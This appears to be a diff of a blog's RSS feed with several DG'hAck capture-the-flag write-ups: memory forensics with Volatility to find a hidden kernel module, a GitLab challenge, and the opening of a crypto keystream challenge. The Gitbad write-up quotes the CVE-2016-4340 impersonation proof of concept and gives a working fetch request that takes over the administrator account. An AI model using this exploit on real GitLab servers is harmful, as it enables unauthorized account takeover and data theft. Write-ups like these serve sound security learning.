+&lt;/code>&lt;/pre>&lt;/div>&lt;p>No dice with the default profiles. We&amp;rsquo;ll have to create a custom one.&lt;/p>
+&lt;h2 id="creating-the-profile">Creating the profile&lt;/h2>
+&lt;p>First, let&amp;rsquo;s find out the linux version (I guessed that it was a linux machine):&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ strings shadowmallet | grep -i &lt;span style="color:#e6db74">&amp;#39;linux version&amp;#39;&lt;/span>
+&lt;span style="color:#ae81ff">0045&lt;/span> Raptor 4000-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
+004a Raptor 4000-LR-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
+Nov &lt;span style="color:#ae81ff">9&lt;/span> 17:30:13 contrib-buster kernel: &lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
+Nov &lt;span style="color:#ae81ff">9&lt;/span> 17:30:13 contrib-buster kernel: &lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
+Nov &lt;span style="color:#ae81ff">9&lt;/span> 17:30:13 contrib-buster kernel: &lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
+Raptor 4000-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
+Raptor 4000-LR-L &lt;span style="color:#f92672">[&lt;/span>Linux version&lt;span style="color:#f92672">]&lt;/span>
+Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
+Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
+SWIMS: Linux Version: %04X
+MESSAGE&lt;span style="color:#f92672">=&lt;/span>Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, finding the right image is a bit tricky. I tried three ISOs before finally finding the right one. At first, seeing &lt;code>Debian 8.3.0-6&lt;/code>. I thought that it was a Debian 8 machine. But this is the version of debian on which gcc was compiled.&lt;/p>
+&lt;p>To find the right ISO, you had to notice:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>contrib-buster&lt;/code>, Buster being the codename for Debian 10&lt;/li>
+&lt;li>&lt;code>2020-04-29&lt;/code>, which gives a pretty good hint about what version to use&lt;/li>
+&lt;/ul>
+&lt;p>Here are the available Buster images:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/shadowmallet-isos.png">&lt;img src="https://nicolasb.fr/assets/dghack/shadowmallet-isos.png" alt="The list of Debian 10 isos">&lt;/a>&lt;/p>
+&lt;p>The closest one to the date is debian 10.4.0, which is the image we&amp;rsquo;re going to use. The next step is to download &lt;a href="https://cdimage.debian.org/mirror/cdimage/archive/10.4.0-live/amd64/iso-hybrid/debian-live-10.4.0-amd64-standard.iso">the ISO (live version)&lt;/a>, boot it in a VM, and generate the profile:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ sudo su
+&lt;span style="color:#75715e"># We can check that we have the right version&lt;/span>
+$ dmesg | head -n &lt;span style="color:#ae81ff">1&lt;/span>
+&lt;span style="color:#f92672">[&lt;/span> 0.000000&lt;span style="color:#f92672">]&lt;/span> Linux version 4.19.0-9-amd64 &lt;span style="color:#f92672">(&lt;/span>debian-kernel@lists.debian.org&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">(&lt;/span>gcc version 8.3.0 &lt;span style="color:#f92672">(&lt;/span>Debian 8.3.0-6&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#75715e">#1 SMP Debian 4.19.118-2 (2020-04-29)&lt;/span>
+&lt;span style="color:#75715e"># And then generate the profile&lt;/span>
+$ apt install volatility-tools build-essential zip
+$ cd /usr/src/volatility-tools/linux
+$ make
+$ zip debian_custom.zip module.dwarf /boot/System.map-4.19.0-9-amd64
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>After getting the profile back to our host system, we have to load it:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cp debian_custom.zip /usr/lib/python2.7/site-packages/volatility/plugins/overlays/linux/debiancustom.zip
+$ volatility --info | grep debian
+Volatility Foundation Volatility Framework 2.6.1
+Linuxdebiancustomx64 - A Profile &lt;span style="color:#66d9ef">for&lt;/span> Linux debiancustom x64
+&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="analyzing-the-image">Analyzing the image&lt;/h2>
+&lt;p>At first glance, there doesn&amp;rsquo;t seem to be anything suspicious going on:&lt;/p>
+&lt;ul>
+&lt;li>no weird processes are running&lt;/li>
+&lt;li>no suspicious files are present&lt;/li>
+&lt;li>reading the logs don&amp;rsquo;t reveal anything&amp;hellip; or at least I thought so&lt;/li>
+&lt;/ul>
+&lt;p>I&amp;rsquo;m not sure how we were supposed to find this, but after trying a lot of the available commands, I discovered:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxdebiancustomx64 -f shadowmallet linux_hidden_modules
+Volatility Foundation Volatility Framework 2.6.1
+Offset &lt;span style="color:#f92672">(&lt;/span>V&lt;span style="color:#f92672">)&lt;/span> Name
+------------------ ----
+0xffffffffc04a6000 netfilter
+0xffffffffc0578300 qni
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The netfilter module may be interesting, so let&amp;rsquo;s dump it:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxdebiancustomx64 -f shadowmallet linux_moddump -b 0xffffffffc04a6000 -D .
+Volatility Foundation Volatility Framework 2.6.1
+Wrote &lt;span style="color:#ae81ff">668514&lt;/span> bytes to netfilter.0xffffffffc04a6000.lkm
+$ file netfilter.0xffffffffc04a6000.lkm
+netfilter.0xffffffffc04a6000.lkm: ELF 64-bit LSB relocatable, Intel 80386, version &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>SYSV&lt;span style="color:#f92672">)&lt;/span>, BuildID&lt;span style="color:#f92672">[&lt;/span>sha1&lt;span style="color:#f92672">]=&lt;/span>43d8d77459d809b0337cbd723733ac10f8b582e8, not stripped
+$ strings -n &lt;span style="color:#ae81ff">10&lt;/span> netfilter.0xffffffffc04a6000.lkm | head -n &lt;span style="color:#ae81ff">10&lt;/span>
+4.19.0-9-amd64
+&lt;span style="color:#f92672">[]&lt;/span>A&lt;span style="color:#ae81ff">\A&lt;/span>&lt;span style="color:#f92672">]&lt;/span>A^A_
+&lt;span style="color:#f92672">[]&lt;/span>A&lt;span style="color:#ae81ff">\A&lt;/span>&lt;span style="color:#f92672">]&lt;/span>A^A_
+YES SHA1 is CORRECT
+B3tterR&lt;span style="color:#f92672">=&lt;/span>H1deMebeTT3r&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">then&lt;/span>!Right?
+hook.cold.5
+__func__.5155
+__this_module
+SHA1Update
+cleanup_module
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>And we find the flag, &lt;code>B3tterR=H1deMebeTT3r=then!Right?&lt;/code>. I guess we were supposed to find this using &lt;code>dmesg&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ volatility --profile&lt;span style="color:#f92672">=&lt;/span>Linuxdebiancustomx64 -f shadowmallet linux_dmesg | grep netfilter
+Volatility Foundation Volatility Framework 2.6.1
+&lt;span style="color:#f92672">[&lt;/span>1605821327.1&lt;span style="color:#f92672">]&lt;/span> netfilter: loading out-of-tree module taints kernel.
+&lt;span style="color:#f92672">[&lt;/span>1605836480.1&lt;span style="color:#f92672">]&lt;/span> netfilter: module verification failed: signature and/or required key missing - tainting kernel
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Or maybe, since I see the string &lt;code>YES SHA1 is CORRECT&lt;/code>, using a SHA1 hash?&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Gitbad</title><link>https://nicolasb.fr/blog/writeup-dghack-gitbad/</link><pubDate>Sat, 28 Nov 2020 05:12:47 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-gitbad/</guid><description>This challenge takes place on a Gitlab instance, where we have to find private data. You start by creating an account, which is automatically validated after a few seconds. Once logged in, you can do a few things, for example:
+create a project create a group edit your profile see the help page see public repositories Nothing seems to be particularly interesting, except for this message, on the help page:</description><content>&lt;p>This challenge takes place on a Gitlab instance, where we have to find private data. You start by creating an account, which is automatically validated after a few seconds. Once logged in, you can do a few things, for example:&lt;/p>
+&lt;ul>
+&lt;li>create a project&lt;/li>
+&lt;li>create a group&lt;/li>
+&lt;li>edit your profile&lt;/li>
+&lt;li>see the help page&lt;/li>
+&lt;li>see public repositories&lt;/li>
+&lt;/ul>
+&lt;p>Nothing seems to be particularly interesting, except for this message, on the help page:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/gitbad-update-asap.png">&lt;img src="https://nicolasb.fr/assets/dghack/gitbad-update-asap.png" alt="The help page showing an &amp;ldquo;update asap&amp;rdquo; message">&lt;/a>&lt;/p>
+&lt;p>Searching for this version yields &lt;a href="https://www.exploit-db.com/exploits/40236">a very interesting CVE&lt;/a>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-markdown" data-lang="markdown">&lt;span style="color:#66d9ef">1.&lt;/span> Description
+Any registered user can &amp;#34;log in&amp;#34; as any other user, including administrators.
+https://about.gitlab.com/2016/05/02/cve-2016-4340-patches/
+&lt;span style="color:#66d9ef">2.&lt;/span> Proof of Concept
+Login as regular user.
+Get current authenticity token by observing any POST-request (ex.: change any info in user profile).
+Craft request using this as template:
+POST /admin/users/stop_impersonation?id=root
+. . .
+_method=delete&lt;span style="color:#960050;background-color:#1e0010">&amp;amp;&lt;/span>authenticity_token=lqyOBt5U%2F0%2BPM2i%2BGDx3zaVjGgAqHzoteQ15FnrQ3E8%3D
+Where &amp;#39;root&amp;#39; - desired user. &amp;#39;authenticity_token&amp;#39; - token obtained on the previous step.
+&lt;span style="color:#66d9ef">3.&lt;/span> Solution:
+Use officialy provided solutions:
+https://about.gitlab.com/2016/05/02/cve-2016-4340-patches/
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>This exploit allows us to login as someone else, as long as we have their username. But we don&amp;rsquo;t know the username of the administrator!&lt;/p>
+&lt;p>Let&amp;rsquo;s look at the API documentation on the help page:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/gitbad-list-users.png">&lt;img src="https://nicolasb.fr/assets/dghack/gitbad-list-users.png" alt="The users list API endpoints">&lt;/a>&lt;/p>
+&lt;p>Exactly what we need! To use it, we&amp;rsquo;ll need our &lt;code>private_token&lt;/code>, which can be found in our account settings. Navigating to:&lt;/p>
+&lt;pre>&lt;code>http://gitbad2.chall.malicecyber.com/api/v3/users?private_token=a9qPQTK_3N9osyKKyqBy
+&lt;/code>&lt;/pre>&lt;p>Gives us:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">[
+{
+&lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;test&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">5&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;state&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;active&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;avatar_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://www.gravatar.com/avatar/b642b4217b34b1e8d3bd915fc65c4452?s=80&amp;amp;d=identicon&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;web_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://b35923e21b4a/u/test&amp;#34;&lt;/span>
+},
+{
+&lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;stephan&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;stephan&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">4&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;state&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;active&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;avatar_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://www.gravatar.com/avatar/5222db2651f07bd3ba821b15c08bbdf5?s=80&amp;amp;d=identicon&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;web_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://b35923e21b4a/u/stephan&amp;#34;&lt;/span>
+},
+{
+&lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Kris&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Kris&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">3&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;state&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;active&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;avatar_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://www.gravatar.com/avatar/7d1c587c79d19087bae4e15c5362c5fb?s=80&amp;amp;d=identicon&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;web_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://b35923e21b4a/u/Kris&amp;#34;&lt;/span>
+},
+{
+&lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;bobby&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;bobby&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">2&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;state&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;active&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;avatar_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://www.gravatar.com/avatar/c7fa9756c768cb88d639ad16761fc8de?s=80&amp;amp;d=identicon&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;web_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://b35923e21b4a/u/bobby&amp;#34;&lt;/span>
+},
+{
+&lt;span style="color:#f92672">&amp;#34;name&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;Administrator&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;username&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;8e4684f1498aad818870376301b15426&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#ae81ff">1&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;state&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;active&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;avatar_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://www.gravatar.com/avatar/e64c7d89f26bd1972efa854d13d7dd61?s=80&amp;amp;d=identicon&amp;#34;&lt;/span>,
+&lt;span style="color:#f92672">&amp;#34;web_url&amp;#34;&lt;/span>: &lt;span style="color:#e6db74">&amp;#34;http://b35923e21b4a/u/8e4684f1498aad818870376301b15426&amp;#34;&lt;/span>
+}
+]
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the username of the administrator is &lt;code>8e4684f1498aad818870376301b15426&lt;/code>. We just have to use the exploit we found. I made the request using &lt;code>fetch&lt;/code>:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-javascript" data-lang="javascript">&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">form&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">FormData&lt;/span>();
+&lt;span style="color:#a6e22e">form&lt;/span>.&lt;span style="color:#a6e22e">append&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;_method&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;delete&amp;#34;&lt;/span>);
+&lt;span style="color:#a6e22e">form&lt;/span>.&lt;span style="color:#a6e22e">append&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;authenticity_token&amp;#34;&lt;/span>, document.&lt;span style="color:#a6e22e">querySelector&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;meta[name=csrf-token]&amp;#39;&lt;/span>).&lt;span style="color:#a6e22e">content&lt;/span>);
+&lt;span style="color:#66d9ef">await&lt;/span> &lt;span style="color:#a6e22e">fetch&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;http://gitbad2.chall.malicecyber.com/admin/users/stop_impersonation?id=8e4684f1498aad818870376301b15426&amp;#34;&lt;/span>, {
+&lt;span style="color:#e6db74">&amp;#34;body&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">form&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#34;method&amp;#34;&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;POST&amp;#34;&lt;/span>,
+});
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The request was a bit tricky to get right, for example I initially thought that I had to post URL encoded params.&lt;/p>
+&lt;p>Entering this little script in our console gives us access to the admin area:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/gitbad-admin-area.png">&lt;img src="https://nicolasb.fr/assets/dghack/gitbad-admin-area.png" alt="The admin area">&lt;/a>&lt;/p>
+&lt;p>A repo instantly stands out from the rest: &lt;code>stephan/my-secret-project&lt;/code>. Reading the code reveals it&amp;rsquo;s a collection of python scripts. The commit history has a particularly suspicious one, called &lt;code>added my private key&lt;/code>:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/gitbad-suspicious-commit.png">&lt;img src="https://nicolasb.fr/assets/dghack/gitbad-suspicious-commit.png" alt="A suspicious commit">&lt;/a>&lt;/p>
+&lt;p>The flag is &lt;code>W3lL-d0N3-y0u-w1n-a_c4ke!&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Involucrypt 1</title><link>https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/</link><pubDate>Fri, 20 Nov 2020 00:27:19 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/</guid><description>This writeup uses a naive approach, see my writeup of involucrypt 2 for a better solution.
 The challenge starts off with two files:
 crypt.py involucrypt1 The first one is a script that can encode a message, the second one contains crypted data.
 Here is the (slightly redacted) script:
-import itertools import operator import sys BLOCK = 150 class mersenne_rng(object): ... def keystream(seeds, length, base=None): key = base if base else [] for seed in seeds: random = mersenne_rng(seed) for _ in range(BLOCK): if len(key) == length: break key.</description></item><item><title>Writeup DG'hAck: Walters Blog</title><link>https://nicolasb.fr/blog/writeup-dghack-walters-blog/</link><pubDate>Thu, 19 Nov 2020 05:56:46 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-walters-blog/</guid><description>The challenge starts with a minecraft blog:
+import itertools import operator import sys BLOCK = 150 class mersenne_rng(object): ... def keystream(seeds, length, base=None): key = base if base else [] for seed in seeds: random = mersenne_rng(seed) for _ in range(BLOCK): if len(key) == length: break key.</description><content>&lt;p>&lt;em>This writeup uses a naive approach, see my &lt;a href="https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/">writeup of involucrypt 2&lt;/a> for a better solution.&lt;/em>&lt;/p>
+&lt;p>The challenge starts off with two files:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>crypt.py&lt;/code>&lt;/li>
+&lt;li>&lt;code>involucrypt1&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;p>The first one is a script that can encode a message, the second one contains crypted data.&lt;/p>
+&lt;p>Here is the (slightly redacted) script:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> itertools
+&lt;span style="color:#f92672">import&lt;/span> operator
+&lt;span style="color:#f92672">import&lt;/span> sys
+BLOCK &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">150&lt;/span>
+&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">mersenne_rng&lt;/span>(object):
+&lt;span style="color:#f92672">...&lt;/span>
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">keystream&lt;/span>(seeds, length, base&lt;span style="color:#f92672">=&lt;/span>None):
+key &lt;span style="color:#f92672">=&lt;/span> base &lt;span style="color:#66d9ef">if&lt;/span> base &lt;span style="color:#66d9ef">else&lt;/span> []
+&lt;span style="color:#66d9ef">for&lt;/span> seed &lt;span style="color:#f92672">in&lt;/span> seeds:
+random &lt;span style="color:#f92672">=&lt;/span> mersenne_rng(seed)
+&lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(BLOCK):
+&lt;span style="color:#66d9ef">if&lt;/span> len(key) &lt;span style="color:#f92672">==&lt;/span> length:
+&lt;span style="color:#66d9ef">break&lt;/span>
+key&lt;span style="color:#f92672">.&lt;/span>append(random&lt;span style="color:#f92672">.&lt;/span>get_rand_int(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">255&lt;/span>))
+random&lt;span style="color:#f92672">.&lt;/span>shuffle(key)
+&lt;span style="color:#66d9ef">if&lt;/span> len(key) &lt;span style="color:#f92672">==&lt;/span> length:
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;span style="color:#66d9ef">return&lt;/span> key
+&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(string, key):
+key &lt;span style="color:#f92672">=&lt;/span> keystream(map(ord, key), len(string))
+stream &lt;span style="color:#f92672">=&lt;/span> itertools&lt;span style="color:#f92672">.&lt;/span>starmap(operator&lt;span style="color:#f92672">.&lt;/span>xor, zip(key, map(ord, string)))
+&lt;span style="color:#66d9ef">return&lt;/span> bytearray(stream)
+&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
+&lt;span style="color:#66d9ef">if&lt;/span> sys&lt;span style="color:#f92672">.&lt;/span>version_info &lt;span style="color:#f92672">&amp;gt;=&lt;/span> (&lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>):
+sys&lt;span style="color:#f92672">.&lt;/span>stdout&lt;span style="color:#f92672">.&lt;/span>buffer&lt;span style="color:#f92672">.&lt;/span>write(encrypt(sys&lt;span style="color:#f92672">.&lt;/span>stdin&lt;span style="color:#f92672">.&lt;/span>read(), sys&lt;span style="color:#f92672">.&lt;/span>argv[&lt;span style="color:#ae81ff">1&lt;/span>]))
+&lt;span style="color:#66d9ef">else&lt;/span>:
+sys&lt;span style="color:#f92672">.&lt;/span>stdout&lt;span style="color:#f92672">.&lt;/span>write(encrypt(sys&lt;span style="color:#f92672">.&lt;/span>stdin&lt;span style="color:#f92672">.&lt;/span>read(), sys&lt;span style="color:#f92672">.&lt;/span>argv[&lt;span style="color:#ae81ff">1&lt;/span>]))
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>I omitted the &lt;code>mersenne_rng&lt;/code> class: you don&amp;rsquo;t need it to solve the challenge. It&amp;rsquo;s a particular type of RNG, the one used by python2. Since the script is cross-version, I think it&amp;rsquo;s just there to ensure coherent results.&lt;/p>
+&lt;p>The encryption consists in XORing the input data with an array of integers, which is generated by the &lt;code>keystream&lt;/code> function. This stream is composed of different blocks of 150 integers. Each block corresponds to a letter of the key, whose ASCII code is used to seed the RNG that generates the block integers.&lt;/p>
+&lt;p>The tricky part is that after adding an integer to the stream (called &lt;code>key&lt;/code> here), it is shuffled:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">key&lt;span style="color:#f92672">.&lt;/span>append(random&lt;span style="color:#f92672">.&lt;/span>get_rand_int(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">255&lt;/span>))
+random&lt;span style="color:#f92672">.&lt;/span>shuffle(key)
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>This makes brute-forcing the blocks independently pretty hard. Fortunately, we don&amp;rsquo;t have to!&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ wc -c involucrypt1
+&lt;span style="color:#ae81ff">370&lt;/span> involucrypt1
